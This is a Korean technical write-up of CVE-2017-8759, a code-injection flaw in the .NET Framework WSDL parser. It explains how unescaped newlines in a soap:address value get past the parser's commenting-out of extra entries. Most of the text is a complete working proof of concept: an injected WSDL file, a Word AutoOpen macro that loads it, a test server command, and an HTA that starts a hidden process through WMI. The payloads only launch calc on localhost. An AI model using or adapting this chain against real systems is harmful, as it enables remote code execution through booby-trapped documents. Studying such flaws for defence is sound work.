# CVE-2017-8759

##1. 취약 버전 확인은 닷넷 프레임워크 버전으로 진행
닷넷 프레임워크 버전과 공용 언어 런타임 버전은 별개이며 취약점 발생 요인은 닷넷 프레임워크로 닷넷 프레임 워크 버전으로 취약 유무를 판별하면 됩니다. 여기서 런타임은 JVM과 같이 프로그램 구동을 위한 가상의 실행 환경으로 이해하면 될 것 같습니다.

취약점 발생은 닷넷 프레임워크 wsdlparser.cs의 PrintClientProxy()메소드에서 줄바꿈 처리 미흡으로 발생되었습니다.


##2. 취약점 동작 방식
닷넷 프레임워크 소스코드 다운로드 URL: https://referencesource.microsoft.com/download.html

먼저 POC 핵심을 살펴보겠습니다.
```xml
<service name="Service">
    <port name="Port" binding="tns:Binding">
        <soap:address location="http://localhost?C:\Windows\System32\calc.exe?011"/>
            <soap:address location=";
                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
            //"/>
    </port>
</service>
```

위는 POC 구성 중 원격 서버에서 받아오는 XML 데이터의 일부입니다.
두개의 "soap:address location" 엘리먼트로 구성되어 있는 것을 볼 수 있습니다.

다음은 취약점이 발생한 wsdlparser.cs의 PrintClientProxy()메소드의 일부분 입니다.

```cs
if (_connectURLs != null)
                {
                    for (int i=0; i<_connectURLs.Count; i++)
                    {
                        sb.Length = 0;
                        sb.Append(indent2);
                        if (i == 0)
                        {
                            sb.Append("base.ConfigureProxy(this.GetType(), ");
                            sb.Append(WsdlParser.IsValidUrl((string)_connectURLs[i]));
                            sb.Append(");");
                        }
                        else
                        {
                            // Only the first location is used, the rest are commented out in the proxy
                            sb.Append("//base.ConfigureProxy(this.GetType(), ");
                            sb.Append(WsdlParser.IsValidUrl((string)_connectURLs[i]));
                            sb.Append(");");
                        }
                        textWriter.WriteLine(sb);
                    }
                }
```

"soap:address location" 엘리먼트의 값을 읽어 base.ConfigureProxy(this.GetType(), [엘리먼트 값]);의 형식으로 동적으로 코드를 구성하는 것을 기본으로 하며 하나 이상의 "soap:address location" 엘리먼트가 존재할 경우,
//base.ConfigureProxy(this.GetType(), [엘리먼트 값]); 의 형식으로 주석 처리하는 것을 알 수 있습니다.

그러나 줄바꿈에 대한 검증 절차가 존재하지 않으므로 POC 코드와 같이 줄바꿈으로 엘리먼트 내용을 삽입할 경우 주석을 우회하여 코드를 삽입할 수 있습니다.

POC의 두 번째 "soap:address location" 엘리먼트의 값

```cs
//base.ConfigureProxy(this.GetType(),;
                                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
                        //);
```

POC 코드 동작 시 아래와 같은 코드가 구성되어 동작할 것을 예상할 수 있습니다.

```cs
base.ConfigureProxy(this.GetType(), "http://localhost?C:\Windows\System32\calc.exe?011");
//base.ConfigureProxy(this.GetType(),;
                                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
                        //);
```

## 3. POC

### poc file
rtf 파일에서 `localhost:8080/exploit.txt` 파일 연결하여 개체로 삽입하거나 다음의 매크로를 삽입한 doc 파일 생성.
```vb
Sub AutoOpen()
Set x = GetObject("soap:wsdl=http://localhost:8080/exploit.txt")
End Sub
```

### poc server
```
python -m SimpleHTTPServer 8080
```

### exploit.txt
```xml
<definitions
    xmlns="http://schemas.xmlsoap.org/wsdl/"
    xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
    xmlns:suds="http://www.w3.org/2000/wsdl/suds"
    xmlns:tns="http://schemas.microsoft.com/clr/ns/System"
    xmlns:ns0="http://schemas.microsoft.com/clr/nsassem/Logo/Logo">
    <portType name="PortType"/>
    <binding name="Binding" type="tns:PortType">
        <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
        <suds:class type="ns0:Image" rootType="MarshalByRefObject"></suds:class>
    </binding>
    <service name="Service">
        <port name="Port" binding="tns:Binding">
            <soap:address location="http://127.0.0.1:8080?C:\Windows\System32\mshta.exe?http://127.0.0.1:8080/cmd.hta"/>
                        <soap:address location=";
                        if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {
                                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
                                System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);
                        } //"/>
        </port>
    </service>
</definitions>
```

### cmd.hta
```html
<html>
<head>
<script language="VBScript">
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WbemScripting.SWbemLocator")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	objConfig.ShowWindow = HIDDEN_WINDOW
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("calc.exe", null, objConfig, intProcessID)
	window.close()
end sub
</script>
</head>
</html>
```
